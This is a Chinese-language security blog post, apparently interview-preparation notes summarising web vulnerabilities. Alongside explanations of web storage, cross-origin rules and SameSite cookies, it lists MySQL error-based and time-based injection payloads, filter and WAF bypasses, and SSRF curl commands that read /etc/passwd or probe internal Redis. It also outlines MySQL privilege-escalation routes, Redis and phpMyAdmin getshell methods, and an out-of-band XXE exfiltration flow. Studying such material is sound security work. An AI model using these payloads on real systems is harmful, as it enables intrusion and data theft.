@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lnva9say.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="一些web漏洞总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="面试准备">
+<meta property="og:url" content="https://lnva9say.top/2020/04/03/%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="baishuo">
+<meta property="og:description" content="一些web漏洞总结">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-04-03T12:35:20.000Z">
+<meta property="article:modified_time" content="2020-04-19T07:31:07.130Z">
+<meta property="article:author" content="baishuo">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://lnva9say.top/2020/04/03/%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>面试准备 | baishuo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">baishuo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lnva9say.top/2020/04/03/%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/baishuo.jpg">
+      <meta itemprop="name" content="baishuo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baishuo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          面试准备
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-03 20:35:20" itemprop="dateCreated datePublished" datetime="2020-04-03T20:35:20+08:00">2020-04-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-19 15:31:07" itemprop="dateModified" datetime="2020-04-19T15:31:07+08:00">2020-04-19</time>
+              </span>
+
+          
+            <div class="post-description">一些web漏洞总结</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>疫情原因，计划实在是赶不上变化。</p>
+<h4 id="1、PHP特性、7-2特性"><a href="#1、PHP特性、7-2特性" class="headerlink" title="1、PHP特性、7.2特性"></a>1、PHP特性、7.2特性</h4><p>7.2 ：新的对象类型（Object）、允许重写抽象方法、扩展了参数类型、允许分组命名空间的尾部逗号（当一个抽象类继承于另外一个抽象类的时候，继承后的抽象类可以重写被继承的抽象类的抽象方法。）    </p>
+<h4 id="2、Mysql5-7的特性"><a href="#2、Mysql5-7的特性" class="headerlink" title="2、Mysql5.7的特性"></a>2、Mysql5.7的特性</h4><p>Mysql5.7的特性只有表的变化 mysql.user这个表的变化 &amp;&amp; 可以用来绕过的特性，新增了sys数据库</p>
+<h4 id="3、前端LocalStorage、SessionStorage"><a href="#3、前端LocalStorage、SessionStorage" class="headerlink" title="3、前端LocalStorage、SessionStorage"></a>3、前端LocalStorage、SessionStorage</h4><p><strong>客户端存储型XSS</strong>：客户端把代码存储到本地 （<strong>localStorage</strong>等）中，之后调用时直接取出原始HTML代码并直接输出到页面里。</p>
+<p><code>localStorage</code>和<code>sessionStorage</code>一样都是用来存储客户端临时信息的对象。</p>
+<p>他们均只能存储字符串类型的对象（虽然规范中可以存储其他原生类型的对象，但是目前为止没有浏览器对其进行实现）。</p>
+<p><code>localStorage</code>生命周期是永久，这意味着除非用户显示在浏览器提供的UI上清除<code>localStorage</code>信息，否则这些信息将永远存在。 </p>
+<p><code>sessionStorage</code>生命周期为当前窗口或标签页，一旦窗口或标    签页被永久关闭了，那么所有通过<code>sessionStorage</code>存储的数据也就被清空了。 </p>
+<p><code>sessionStorage</code> 是HTML5新增的一个会话存储对象,用于临时保存同一窗口(或标签页)的数据,在关闭窗口或标签页之后将会删除这些数据。</p>
+<p><a href="https://jerryzou.com/posts/cookie-and-web-storage/" target="_blank" rel="noopener">https://jerryzou.com/posts/cookie-and-web-storage/</a></p>
+<h5 id="LocalStorage："><a href="#LocalStorage：" class="headerlink" title="LocalStorage："></a>LocalStorage：</h5><p>localStorage 是 HTML5 标准中新加入的技术，它并不是什么划时代的新东西。早在 IE 6 时代，就有一个叫 userData  的东西用于本地存储，而当时考虑到浏览器兼容性，更通用的方案是使用 Flash。而如今，localStorage  被大多数浏览器所支持，如果你的网站需要支持 IE6+，那以 userData 作为你的 polyfill 的方案是种不错的选择。</p>
+<h5 id="SessionStorage："><a href="#SessionStorage：" class="headerlink" title="SessionStorage："></a>SessionStorage：</h5><p>sessionStorage 与 localStorage 的接口类似，但保存数据的生命周期与 localStorage  不同。做过后端开发的同学应该知道 Session 这个词的意思，直译过来是“会话”。而 sessionStorage  是一个前端的概念，它只是可以将一部分数据在当前会话中保存下来，刷新页面数据依旧存在。但当页面关闭后，sessionStorage  中的数据就会被清空。</p>
+<p><a href="https://jerryzou.com/posts/cookie-and-web-storage/" target="_blank" rel="noopener">https://jerryzou.com/posts/cookie-and-web-storage/</a></p>
+<h4 id="4、SQL注入"><a href="#4、SQL注入" class="headerlink" title="4、SQL注入"></a>4、SQL注入</h4><p>sleep被禁用后如何进行sql注入</p>
+<p>Benchmark,get_lock函数 ，如果全被Ban掉可以用计算量比较大的语句使时间变长</p>
+<h5 id="1、between注入："><a href="#1、between注入：" class="headerlink" title="1、between注入："></a>1、between注入：</h5><h5 id="https-www-anquanke-com-post-id-158674"><a href="#https-www-anquanke-com-post-id-158674" class="headerlink" title="https://www.anquanke.com/post/id/158674"></a><a href="https://www.anquanke.com/post/id/158674" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158674</a></h5><p>BETWEEN操作符在WHERE子句中使用，作用是选取介于两个值之间的数据范围。也就说让我们可以运用一个范围(range)内抓出数据库中的值。</p>
+<p><code>between and</code>有数据比较功能  如果exp1的结果处于min和max之间,<code>between and</code>就返回<code>1</code>,反之返回<code>0</code>.</p>
+<p>在盲注中应用 </p>
+<p><code>between and</code>可以用来在过滤了<code>=</code>,<code>like</code>, <code>regexp</code>,<code>&gt;</code>,<code>&lt;</code>的情况下使用.  判断是查询到的值是否在这个区间内</p>
+<p>可以配合截取函数使用 ：如 mid </p>
+<p>截取函数被过滤</p>
+<p>单引号被过滤 </p>
+<p>比如单引号过滤、支持十六进制的绕过姿势 用于盲注 </p>
+<h5 id="2、order-by注入-https-www-anquanke-com-post-id-158674"><a href="#2、order-by注入-https-www-anquanke-com-post-id-158674" class="headerlink" title="2、order by注入: https://www.anquanke.com/post/id/158674"></a>2、order by注入: <a href="https://www.anquanke.com/post/id/158674" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158674</a></h5><p>基于 order by 的注入有盲注和报错注入</p>
+<p>需要<code>字段名</code>的情况通常是，执行了查询语句，然后根据查询结果排序的差别进行盲注</p>
+<p>引起mysql错误进行盲注，不需要知道字段名条件为false是，值为<code>select 1 from information_schema.tables</code>，mysql会报错: <code>Subquery returns more than 1 row</code>, 导致查询结果为空.这样就可以根据查询结果是否为空，判断条件的真假</p>
+<p>基于时间的盲注</p>
+<p>procedure存储过程支持报错</p>
+<h5 id="3、limit-注入："><a href="#3、limit-注入：" class="headerlink" title="3、limit 注入："></a>3、limit 注入：</h5><p>一般实际过程中使用 limit 时，大概有两种情况，一种使用<code>order by</code>，一种就是不使用 <code>order by</code>关键字</p>
+<p>存在order by关键字：select id from users order by id desc limit 0,1; 此时在加上union会报错</p>
+<p>limit 关键字后面还可跟<code>PROCEDURE</code>和 <code>INTO</code>两个关键字，但是 <code>INTO</code> 后面写入文件需要知道绝对路径以及写入shell的权限，因此利用比较难，因此这里以<code>PROCEDURE</code>为例进行注入</p>
+<p>imit 关键字后面还可跟<code>PROCEDURE</code>和 <code>INTO</code>两个关键字 </p>
+<p>在Limit后面 可以用 procedure analyse()这个子查询</p>
+<p>而PROCEDURE analyse()可进行报错注入和延时注入   </p>
+<p>select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</p>
+<h5 id="4、Mysql报错注入"><a href="#4、Mysql报错注入" class="headerlink" title="4、Mysql报错注入"></a>4、Mysql报错注入</h5><p>​    • <strong>数据类型溢出</strong></p>
+<p>​        • select exp(~(select*from(select user())x)); # MySQL &lt; 5.5.53</p>
+<p>​        • # pow, cot</p>
+<p>​    • <strong>几何函数报错</strong></p>
+<p>​        • select multipoint((select * from (select * from (select version())a)b)); # 低版本</p>
+<p>​        • # geometrycollection multipoint polygon multipolygon linestring multilinestring等 </p>
+<p>​    • <strong>Xpath语法错误</strong></p>
+<p>​        • select updatexml(1,concat(0x3a,(select @@version),0x3a),1) # MySQL &gt; 5.1</p>
+<p>​        • select extractvalue(1,concat(0x3a,(select @@version),0x3a))</p>
+<p>​    • <strong>MySQL 5.7新增：</strong></p>
+<p>​        • GTID_SUBSET / GTID_SUBTRACT / ST_LatFromGeoHash /ST_LongFromGeoHash / ST_PointFromGeoHash</p>
+<p>​    • <strong>MySQL特性报错</strong></p>
+<p>​        • Duplicate column name</p>
+<p>​            • select * from(select * from mysql.user a join mysql.user b)c;</p>
+<p>​            • select * from (select name_const(version(),0), name_const(version(),0))x;</p>
+<h5 id="Mysql时间盲注"><a href="#Mysql时间盲注" class="headerlink" title="Mysql时间盲注"></a>Mysql时间盲注</h5><p>​    • SLEEP</p>
+<p>​    • BENCHMARK</p>
+<p>​    • 笛卡尔积</p>
+<p>​    • If (ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM </p>
+<p>information_schema.columns A, information_schema.columns B,information_schema.tablesC),1)#</p>
+<p>​    • 无法理解则请自己复习《线性代数》与《数据库系统原理》 </p>
+<p>​    • 正则延迟</p>
+<p>​    • 报错盲注</p>
+<h5 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h5><p>​    <strong>常见绕过</strong></p>
+<p>​        • admin等被查找的字符 –》 extractvalue等编码函数：</p>
+<p>​            SELECT “admin” =</p>
+<p>SELECT extractvalue(0x3C613E61646D696E3C2F613E,0x2f61) </p>
+<p>​            SELECT “admin” =</p>
+<p>SELECT (char(97)+char(100)+char(109)+char(105)+char(110))</p>
+<p>​        • 关键字%00绕过：</p>
+<p>​            SELECT = SE\x00LECT (\x00指ASCII为0的字符）</p>
+<p><strong>WAF Bypass</strong></p>
+<p>​    • 不同WAF有不同Bypass方法，实在是太多了。</p>
+<p>​    • 把sqlmap自带的tamper全部过一遍，到时候根据被过滤的字符来随机应变。</p>
+<p>​    • <a href="https://xz.aliyun.com/t/2746" target="_blank" rel="noopener">https://xz.aliyun.com/t/2746</a></p>
+<p>​    • <a href="https://www.freebuf.com/sectool/179035.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/179035.html</a></p>
+<p>​        </p>
+<p>​    </p>
+<h4 id="4、本地包含RCE"><a href="#4、本地包含RCE" class="headerlink" title="4、本地包含RCE"></a>4、本地包含RCE</h4><p><a href="https://chybeta.github.io/2017/10/08/php文件包含漏洞/" target="_blank" rel="noopener">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p>
+<p>分类：本地文件包含（LFI）  、远程文件包含（RFI）</p>
+<p>RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
+<ol>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>姿势：</p>
+<p>1、php伪协议：php://input 、phar://指定绝对路径、zip://需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。、data:URI schema</p>
+<p>2、包含session ：session文件路径已知、内容部分可控</p>
+<p>3、包含日志： 需要知道服务器日志的存储路径，且日志文件可读。</p>
+<p>4、SSH log ：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
+<p>5、包含environ：php以cgi方式运行，这样environ才会保持UA头，environ文件存储位置已知，且environ文件可读。</p>
+<p>6、包含临时文件：php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<p>7、包含上传文件</p>
+<h4 id="5、IIS短文件名漏洞原理"><a href="#5、IIS短文件名漏洞原理" class="headerlink" title="5、IIS短文件名漏洞原理"></a>5、IIS短文件名漏洞原理</h4><p>IIS短文件名是一个Windows系统为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。当这种特性被IIS中间件继承后，我们就可以使用短文件名进行目录猜解。</p>
+<p>通过用<del>符号来代替 比如 我们访问`/admini</del>1<code>也可以相当于访问</code>administrator`</p>
+<p>查询是否开启短文件名功能：<code>fsutil 8dot3name query</code></p>
+<h4 id="6、SSRF无回显如何利用"><a href="#6、SSRF无回显如何利用" class="headerlink" title="6、SSRF无回显如何利用"></a>6、SSRF无回显如何利用</h4><p>利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<p>1、查看内网开放的主机和端口 。    </p>
+<p>2、根据存在的端口进行应用识别</p>
+<p>3、根据识别的应用和漏洞构造对应payload进行验证</p>
+<p>无回显情况下通过VPS NC，dnslog来监听所有URL Schema存在情况 </p>
+<p>测试所有可用的URL Schema：file:// dict:// sftp:// ldap:// tftp:// gopher:</p>
+<p>利用：</p>
+<p>1、利用ceye.io将回显带出 然后查看DNS request。</p>
+<p><code>Gopher</code> 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 <code>FTP、Telnet、Redis、Memcache</code>，也可以进行 <code>GET、POST</code> 请求。</p>
+<p><code>DICT</code>协议,一个字典服务器协议,<code>A Dictionary Server Protocol</code>，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号:<code>2628</code>。 使用dict协议那么就可以轻易的获取目标服务器端口上运行的服务版本等信息。如redis /info 3306/info</p>
+<p><a href="https://xz.aliyun.com/t/6373#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/6373#toc-2</a></p>
+<p><a href="https://xz.aliyun.com/t/7333#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7333#toc-4</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用file协议curl -v file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">使用ftp协议 curl -v &quot;ftp:&#x2F;&#x2F;127.0.0.1:端口&#x2F;info&quot;</span><br><span class="line">使用dict协议 curl -v &quot;dict:&#x2F;&#x2F;127.0.0.1:端口&#x2F;info&quot;</span><br><span class="line">使用gopher协议 curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:端口&#x2F;_info&quot;</span><br></pre></td></tr></table></figure>
+
+<p>*<em>ssrf Bypass  *</em> <a href="https://xz.aliyun.com/t/2115#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115#toc-4</a></p>
+<ul>
+<li>IP限制绕过（xip.io,十进制IP,八进制IP）</li>
+<li>协议限制绕过（Redirect,CRLF header injection）</li>
+<li>调用系统支持的协议和方法</li>
+<li>URL跳转绕过</li>
+<li>短网址绕过</li>
+<li>限制了子网段，可以加 :80 端口绕过</li>
+</ul>
+<h5 id="4、ssrf攻击内网redis"><a href="#4、ssrf攻击内网redis" class="headerlink" title="4、ssrf攻击内网redis"></a>4、ssrf攻击内网redis</h5><p><a href="https://www.smi1e.top/gopher-ssrf攻击内网应用复现/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></p>
+<p>1、抓取数据保文： 1、在靶机中利用socat抓取发往redis的数据报文，socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 </p>
+<p>2、这里先将要执行的命令写入了shell.sh中，方便一次性执行完毕</p>
+<p>3、./shell.sh 192.168.85.132 4444</p>
+<p>2、利用gopher进行攻击：将数据转换成gopher协议的格式，本地先监听23333端口，利用curl发送payload。</p>
+<h4 id="7、http-only绕过"><a href="#7、http-only绕过" class="headerlink" title="7、http-only绕过"></a>7、http-only绕过</h4><p>1、劫持钓鱼绕过</p>
+<p>2、HTML5的CORS特性绕过httpOnly实现会话劫持</p>
+<p>3、方式一、 HTTP Trace  (CROSS-SITE    TRACING, XST)</p>
+<p>4、探针文件 （phpinfo.php）</p>
+<p>5、WEB服务器漏洞 – Apache&lt;2.2.22  (CVE-2012-0053)</p>
+<h4 id="8、mysql提权方法"><a href="#8、mysql提权方法" class="headerlink" title="8、mysql提权方法"></a>8、mysql提权方法</h4><p><a href="https://xz.aliyun.com/t/2719#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/2719#toc-7</a></p>
+<p>1、UDF提权：是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用</p>
+<ul>
+<li>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</li>
+<li>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</li>
+</ul>
+<p>利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
+<p>也就是说写入udf.dll以后 需要creadt function 去调用动态链接库的函数</p>
+<p>2、MOF提权：MOF叫做”托管对象格式，mysql以root身份启动，有</p>
+<p>权限去读写c:/windows/system32/wbem/mof目录。</p>
+<p>MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
+<p>3、启动项提权：原理还是使用mysql写文件，写入一段VBS代码到开机自启动中，服务器重启达到创建用户并提权，可以使用DDOS迫使服务器重启。</p>
+<p>提权条件:file_priv 不为null<br>已知root密码</p>
+<h4 id="9、前端中的跨域"><a href="#9、前端中的跨域" class="headerlink" title="9、前端中的跨域"></a>9、前端中的跨域</h4><p>1、同源策略：通常允许写操作，例如链接，重定向等。允许跨域嵌套资源，例如img，script标签等。不允许跨域读操作 只有资源之间的协议，域名和端口号都相同，才是同一个源。</p>
+<p>​    同源策略由两种限制，第一种是限制了不同源直接的请求交互，例如再使用XMLHttpRequest或fetch函数时则会受到同源策略的约束。第二个限制是浏览器中不同源的框架之间是不能进行js的交互操作的。比如通过iframe和window.open产生不同源的窗口。这两种限制都有不同的解决方案。</p>
+<p>​    1.1    对于&lt; a&gt; &lt; script&gt; &lt; img&gt; &lt; video&gt; &lt; link&gt;这类属性带有src、herf的标签，允许跨域加载</p>
+<p>​    1.2    跨域请求可以发出，单数浏览器查看返回包发现跨域且无CORS投则会丢弃，而且不同子域之间默认是不同源的</p>
+<p>​    1.3    IE 未将端口号加入到同源策略的组成部分之中，因此<code>company.com:81/index.html</code>和<code>company.com/index.html</code>属于同源并且不受任何限制。</p>
+<p>​    <code>&lt; script&gt; &lt; img&gt; &lt; iframe&gt; &lt; link&gt;</code>等带src属性的标签都可以跨域加载资源，而不受同源策略的限制。<br>​    每次加载时都会由浏览器发送一次GET请求，通过src属性加载的资源，浏览器会限制JavaScript的权限，使其不能读写返回的内容。</p>
+<p>2、JSONP：用过script标签进行跨域请求，前端设置好回调函数callback，把回调何函数当作请求url携带参数。也可以使用AJAEX GET请求方式来跨域请求</p>
+<p>3、CORS：跨域资源共享，云悉在服务端进行相关设置后，进行跨域通信</p>
+<p>4、ServerProxy：通过服务端代理请求的方式也是解决浏览器跨域问题的方案</p>
+<p>5、location.hash + iframe   :其实就是 URL 的锚部分(从 # 号开始的部分) 具体原理是改变hash并不会导致页面刷新，所以可以利用hash值来进行数据传递。</p>
+<p>6、document.domain + iframe :此方法只能影响顶级域名相同子域名不同之间的同源规则。</p>
+<p>7、windows.name + iframe :</p>
+<p> window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。</p>
+<p>8、PostMessage：方法是html5新引进的特性。调用postMessage方法的window对象是指要接受消息的哪一个window对象</p>
+<p><a href="https://xz.aliyun.com/t/4470" target="_blank" rel="noopener">https://xz.aliyun.com/t/4470</a></p>
+<h4 id="10、HQL注入"><a href="#10、HQL注入" class="headerlink" title="10、HQL注入"></a>10、HQL注入</h4><p>Hibernate是一种ORM框架，用来映射与tables相关的类定义（代码）</p>
+<p>内部可以使用原生SQL还有HQL语言进行SQL操作。</p>
+<p>HQL查询是由hibernate引擎对查询进行解析并解释，然后将其转换为SQL。</p>
+<h5 id="SQLserver执行命令"><a href="#SQLserver执行命令" class="headerlink" title="SQLserver执行命令"></a>SQLserver执行命令</h5><p>1、xp_cmdshell</p>
+<p>2、sp_OACREATE</p>
+<p>3、通过沙盒执行命令</p>
+<h4 id="11、Redis在windows下getshell"><a href="#11、Redis在windows下getshell" class="headerlink" title="11、Redis在windows下getshell"></a>11、Redis在windows下getshell</h4><p>001、<strong>利用 powershell 反弹 shell **      **写进启动项</strong></p>
+<p>002、<strong>使用 mshta.exe **             **写进启动项</strong></p>
+<p>003、<strong>使用Cobalt Strike **           **写进启动项</strong></p>
+<p>004、<strong>利用web服务</strong></p>
+<p>005、<strong>写进启动项</strong></p>
+<h4 id="12、phpadmin-getshell"><a href="#12、phpadmin-getshell" class="headerlink" title="12、phpadmin getshell"></a>12、phpadmin getshell</h4><p>1、常用方法就是 select into outfile 写shell了  LOAD_FILE 读文件、在Windows下可利用UNC路径实现数据外带、LOAD DATA LOCAL INFILE读文件</p>
+<p>2、利用日志写shell</p>
+<p>3、获取管理员密码 ： wce抓明文或者hash 3389连接</p>
+<p>4、慢查询写shell： 当运行时间超过<code>long_query_time</code>的值的语句，则会记录到慢查询日志中</p>
+<p>5、php爆绝对路径方法</p>
+<p>1、单引号爆路径</p>
+<p>2、错误参数值爆路径</p>
+<p>3、Google爆路径</p>
+<p>4、测试文件爆路径</p>
+<p>5、phpadmin爆路径</p>
+<p>6、配置文件找路径</p>
+<p>7、nginx文件错误类型解析爆路径</p>
+<p>8、phpinfo</p>
+<p>9、日志路径</p>
+<h4 id="13、cookie的same-site"><a href="#13、cookie的same-site" class="headerlink" title="13、cookie的same-site"></a>13、cookie的same-site</h4><p>Same-Site Cookies 出现以前我们并没有一种简单而有效的方式去阻止 CSRF 攻击，其中一种方式是通过检查 origin 和 referer 来校验，缺点是依赖浏览器发送正确的字段，而这并不总是准确有效的；另一种方式则是通过给表单添加随机 token 的方式来校验，但是部署比较麻烦。</p>
+<p>Same-Site Cookies 的出现就是为了解决这个问题，它可以完全有效的阻止 CSRF 攻击。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key=<span class="keyword">value</span>; path=/; SameSite</span><br></pre></td></tr></table></figure>
+
+<h5 id="SameSite-Strict-、Lax"><a href="#SameSite-Strict-、Lax" class="headerlink" title="SameSite = Strict 、Lax"></a>SameSite = Strict 、Lax</h5><p>准确的说 SameSite 这个属性有两个可选值，分别是 Strict 和 Lax 。其中 Strict 为严格模式，另一个域发起的任何请求都不会携带该类型的 cookie，能够完美的阻止 CSRF 攻击，但是也可能带来了少许不便之处，例如通过一个导航网站的超链接打开另一个域的网页会因为没有携带 cookie 而导致没有登录等问题。因此 Lax 相对于 Strict 模式来说，放宽了一些。</p>
+<h4 id="14、XXE"><a href="#14、XXE" class="headerlink" title="14、XXE"></a>14、XXE</h4><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。</p>
+<p>有回显，可以直接在页面中看到payload的执行结果或现象。<br>无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p>
+<p><em>无回显攻击流程：</em></p>
+<ul>
+<li><p>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</p>
+</li>
+<li><p>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</p>
+</li>
+<li><p>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</p>
+<p>这样就实现了外带数据的效果，解决 XXE 无回显的问题。   </p>
+</li>
+</ul>
